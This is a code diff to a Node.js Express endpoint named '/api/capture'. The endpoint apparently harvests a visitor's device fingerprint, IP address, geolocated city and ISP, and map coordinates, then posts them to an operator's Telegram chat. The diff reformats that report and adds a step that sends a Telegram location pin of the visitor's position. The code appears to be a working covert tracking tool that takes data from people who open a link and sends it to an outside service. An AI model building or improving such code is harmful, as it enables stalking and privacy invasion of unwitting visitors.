@@ -266,40 +266,46 @@ app.post('/api/capture', async (req, res) => {
   const ipMapLink = (ipLoc && ipLoc.lat) ? `https://maps.google.com/?q=${ipLoc.lat},${ipLoc.lon}` : null;
 
   const lines = [
-    '🖥 *Device Checked*',
-    '━━━━━━━━━━━━━━━━━━━━━━━━',
+    '🖥 *DEVICE CHECKED*',
+    '━━━━━━━━━━━━━━━━━━',
     '',
-    `${deviceEmoji} *DEVICE INFO*`,
-    `📱 Model: \`${finalModel || 'N/A'}\``,
+    `👤 *Device:* \`${finalModel || 'N/A'}\``,
     `💻 OS: ${finalOS} | Browser: ${finalBrowser}`,
-    `🖥 Screen: ${screen || 'N/A'} ${colorDepth ? colorDepth+'bit' : ''} ${pixelRatio ? '@'+pixelRatio+'x' : ''}`,
+    `🖥 Screen: ${screen || 'N/A'} ${pixelRatio ? '@'+pixelRatio+'x' : ''}`,
     `🧠 CPU: ${cores || 'N/A'} cores | RAM: ${memory || 'N/A'} GB`,
     `🔋 Battery: ${battStr}`,
     `📶 Network: ${networkStr}`,
-    `🌍 Language: ${language || 'N/A'}`,
-    `🕐 Timezone: ${timezone || 'N/A'}`,
+    `🌍 Language: ${language || 'N/A'} | Timezone: ${timezone || 'N/A'}`,
     `🔑 Hash: \`${deviceHash || 'N/A'}\``,
     '',
-    '━━━━━━━━━━━━━━━━━━━━━━━━',
-    '🌐 *NETWORK*',
-    `🔌 IP Address: \`${ip}\``,
+    '🌐 *IP & LOCATION*',
+    `🔌 IP: \`${ip}\``,
   ];
 
   if (ipLoc) {
-    lines.push(`${flag} Country: ${ipLoc.country || 'Unknown'}`);
-    lines.push(`🏙 City: ${[ipLoc.city, ipLoc.region, ipLoc.zip].filter(Boolean).join(', ')}`);
+    lines.push(`🏳 ${flag} ${ipLoc.country || 'Unknown'}`);
+    lines.push(`🏙 ${[ipLoc.city, ipLoc.region].filter(Boolean).join(', ')}`);
     lines.push(`📡 ISP: ${ipLoc.isp || 'Unknown'}`);
-    if (ipMapLink) {
+    if (ipLoc.lat && ipLoc.lon) {
       lines.push('');
-      lines.push(`[🗺 Open Google Maps — ${ipLoc.city || 'Location'}](${ipMapLink})`);
+      lines.push(`📍 [Google Maps — ${ipLoc.city || 'IP Location'}](${'https://maps.google.com/?q=' + ipLoc.lat + ',' + ipLoc.lon})`);
     }
   }
 
   lines.push('');
-  lines.push('━━━━━━━━━━━━━━━━━━━━━━━━');
-  lines.push(`🕐 *Time:* ${now}`);
+  lines.push(`🕐 ${now}`);
 
   sendTelegramMessage(lines.join('\n'));
+
+  if (ipLoc && ipLoc.lat && ipLoc.lon) {
+    bot.sendLocation(TELEGRAM_CHAT_ID, ipLoc.lat, ipLoc.lon, {
+      horizontal_accuracy: 500
+    }).then(function() {
+      console.log('Telegram: IP location pin sent OK');
+    }).catch(function(e) {
+      console.log('Telegram location pin error:', e.message);
+    });
+  }
 
   saveDevice({
     id, deviceHash: deviceHash || null, ip,
